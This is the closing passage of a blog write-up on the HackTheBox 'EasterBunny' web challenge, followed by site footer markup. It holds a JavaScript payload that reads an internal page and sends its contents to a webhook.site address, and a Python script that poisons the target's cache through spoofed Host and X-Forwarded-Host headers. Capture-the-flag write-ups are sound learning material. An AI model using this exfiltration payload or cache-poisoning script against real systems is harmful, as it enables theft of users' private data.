+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;http://127.0.0.1/message/3&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;<span class="keyword">return</span> res.<span class="title function_">text</span>();&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span><span class="title function_">fetch</span>(<span class="string">&quot;http://webhook.site/ae5a8c4b-5567-4da6-abbf-cbb4908426fe?log=&quot;</span>+<span class="title function_">btoa</span>(res)));</span><br></pre></td></tr></table></figure>
+<p>python腳本(因為header和環境那些最乾淨)  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://94.237.62.195:59541&#x27;</span></span><br><span class="line">my_server=<span class="string">&#x27;william957-web.github.io&#x27;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;Host&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line"><span class="string">&#x27;X-Forwarded-Host&#x27;</span> : my_server</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">web=req.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/message/1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cur_id=web.json()[<span class="string">&#x27;count&#x27;</span>]</span><br><span class="line"></span><br><span class="line">web=req.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/letters?id=<span class="subst">&#123;cur_id+<span class="number">1</span>&#125;</span>&#x27;</span>, headers=headers)</span><br><span class="line"><span class="keyword">if</span> my_server <span class="keyword">in</span> web.text:</span><br><span class="line">    info(<span class="string">&quot;Cache poisoned!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">req.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/submit&#x27;</span>,json=&#123;<span class="string">&#x27;message&#x27;</span> : <span class="string">&#x27;pwned by whale120&#x27;</span>&#125;)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rkc8usAlR.png" alt="image"><br>FINALLY!!!</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213597">https://www.anquanke.com/post/id/213597</a>  </li>
+<li><a target="_blank" rel="noopener" href="https://h0pp1.github.io/posts/easter-bunny/">https://h0pp1.github.io/posts/easter-bunny/</a></li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cache-Analyzation"><span class="toc-number">2.</span> <span class="toc-text">Cache Analyzation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cache-Poisoning"><span class="toc-number">3.</span> <span class="toc-text">Cache Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">5.</span> <span class="toc-text">References</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&text=EasterBunny on HackTheBox"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&is_video=false&description=EasterBunny on HackTheBox"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=EasterBunny on HackTheBox&body=Check out this article: http://wha13.github.io/2024/04/18/eastern-rabbit-htb/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&name=EasterBunny on HackTheBox&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&t=EasterBunny on HackTheBox"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
